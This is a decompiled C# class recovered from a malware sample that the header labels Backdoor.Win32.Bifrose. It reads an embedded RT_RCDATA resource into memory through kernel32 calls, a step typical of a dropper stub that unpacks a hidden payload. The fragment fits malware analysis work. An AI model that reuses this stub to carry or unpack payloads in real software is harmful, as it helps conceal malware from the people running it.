// Decompiled with JetBrains decompiler
// Type: iSimon.ResourceReader
// Assembly: DPCS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EE2DA26E-EE38-4116-9F1E-B3EC5FEAAEBB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Backdoor.Win32.Bifrose.fsi-f8c5d83d9692f7d250ad1a6ac45a22daed295b288e5b811a274af0b9f6217b17.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;

namespace iSimon
{
  [StandardModule]
  internal sealed class ResourceReader
  {
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

    public static byte[] ReadResource(string filename)
    {
      IntPtr moduleHandle = ResourceReader.GetModuleHandle(ref filename);
      IntPtr resource = ResourceReader.FindResource(moduleHandle, "0", "RT_RCDATA");
      IntPtr source = ResourceReader.LoadResource(moduleHandle, resource);
      int length = ResourceReader.SizeofResource(moduleHandle, resource);
      byte[] destination = new byte[checked (length - 1 + 1)];
      Marshal.Copy(source, destination, 0, length);
      return destination;
    }
  }
}
